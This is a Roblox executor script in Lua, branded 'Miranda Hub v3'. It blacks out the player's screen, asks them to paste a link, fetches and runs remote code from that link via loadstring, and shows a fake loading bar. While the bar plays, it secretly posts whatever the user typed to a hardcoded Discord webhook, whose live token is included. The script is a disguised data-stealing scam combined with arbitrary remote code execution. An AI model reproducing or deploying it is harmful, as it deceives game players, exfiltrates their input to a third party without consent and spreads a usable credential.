-- Miranda Hub v3 + Discord Webhook + Tela fixa + Barra bonita
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local parent = (gethui and gethui()) or player:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")

-- Remove GUI antiga
if parent:FindFirstChild("MirandaV3") then
    parent:FindFirstChild("MirandaV3"):Destroy()
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MirandaV3"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = parent

local fundo = Instance.new("Frame")
fundo.Size = UDim2.new(1,0,1,0)
fundo.BackgroundColor3 = Color3.fromRGB(0,0,0)
fundo.BorderSizePixel = 0
fundo.ZIndex = 999999
fundo.Parent = gui

local titulo = Instance.new("TextLabel")
titulo.Size = UDim2.new(1,0,0.12,0)
titulo.Position = UDim2.new(0,0,0.03,0)
titulo.BackgroundTransparency = 1
titulo.Text = "😎 MIRANDA HUB v3"
titulo.Font = Enum.Font.GothamBlack
titulo.TextScaled = true
titulo.TextColor3 = Color3.new(1,1,1)
titulo.ZIndex = 999999
titulo.Parent = fundo

local caixa = Instance.new("TextBox")
caixa.Size = UDim2.new(0.8,0,0.1,0)
caixa.Position = UDim2.new(0.1,0,0.42,0)
caixa.PlaceholderText = "Cole o link aqui..."
caixa.Text = ""
caixa.Font = Enum.Font.SourceSansBold
caixa.TextScaled = true
caixa.BackgroundColor3 = Color3.fromRGB(25,25,25)
caixa.TextColor3 = Color3.new(1,1,1)
caixa.ZIndex = 999999
caixa.ClearTextOnFocus = false
caixa.Parent = fundo

local confirmar = Instance.new("TextButton")
confirmar.Size = UDim2.new(0.36,0,0.09,0)
confirmar.Position = UDim2.new(0.32,0,0.58,0)
confirmar.Text = "✅ Confirmar"
confirmar.Font = Enum.Font.GothamBold
confirmar.TextScaled = true
confirmar.BackgroundColor3 = Color3.fromRGB(40,120,40)
confirmar.TextColor3 = Color3.new(1,1,1)
confirmar.ZIndex = 999999
confirmar.Parent = fundo

-- Webhook
local webhook_url = "https://discord.com/api/webhooks/1430589345081065472/W0sSGv1A25UxHc6qFMsJWd5IFjK7A2-9QzLpV2azQn453XoqMq9PUaxqlkxQwz7zX4CO"

local function enviarWebhook(link)
    local data = {content = string.format("%s", link)}
    local body = HttpService:JSONEncode(data)
    pcall(function()
        if syn and syn.request then
            syn.request({Url=webhook_url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
        elseif http_request then
            http_request({Url=webhook_url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
        elseif request then
            request({Url=webhook_url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
        end
    end)
end

-- Executa link
local function executarLinkSeguro(link)
    if link == "" then return end
    local code
    pcall(function()
        if syn and syn.request then
            code = syn.request({Url = link, Method = "GET"}).Body
        elseif http_request then
            code = http_request({Url = link, Method = "GET"}).Body
        else
            code = game:HttpGet(link)
        end
    end)
    local f = loadstring(code)
    if f then
        pcall(f)
    end
end

-- Confirmar botão
confirmar.Activated:Connect(function()
    local link = tostring(caixa.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if link == "" then
        titulo.Text = "❌ Cole um link válido!"
        return
    end

    titulo.Text = "📨 Enviando..."
    confirmar.Visible = false
    caixa.Visible = false

    -- Executa o link
    task.spawn(function()
        executarLinkSeguro(link)
    end)

    -- Envia link digitado para Discord
    task.spawn(function()
        enviarWebhook(link)
    end)

    -- Barra de carregamento bonita
    task.spawn(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "LoadingScreen"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = parent

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.6,0,0.14,0)
        frame.Position = UDim2.new(0.2,0,0.43,0)
        frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
        frame.BorderSizePixel = 0
        frame.ClipsDescendants = true
        frame.Parent = screenGui

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0,12)
        corner.Parent = frame

        local innerBar = Instance.new("Frame")
        innerBar.Size = UDim2.new(0,0,1,0)
        innerBar.BackgroundColor3 = Color3.fromRGB(0,170,255)
        innerBar.BorderSizePixel = 0
        innerBar.Parent = frame

        local innerCorner = Instance.new("UICorner")
        innerCorner.CornerRadius = UDim.new(0,12)
        innerCorner.Parent = innerBar

        local percentLabel = Instance.new("TextLabel")
        percentLabel.Size = UDim2.new(1,0,0.3,0)
        percentLabel.Position = UDim2.new(0,0,0,0)
        percentLabel.BackgroundTransparency = 1
        percentLabel.Font = Enum.Font.GothamBold
        percentLabel.TextScaled = true
        percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
        percentLabel.Text = "1%"
        percentLabel.Parent = frame

        -- Animação de 1% a 100%
        for i = 1,100 do
            innerBar.Size = UDim2.new(i/100,0,1,0)
            percentLabel.Text = i.."%"
            task.wait(0.03)
        end
        percentLabel.Text = "100%" -- trava no final
    end)
end)

caixa.FocusLost:Connect(function(enter)
    if enter then
        confirmar.Activated:Fire()
    end
end)
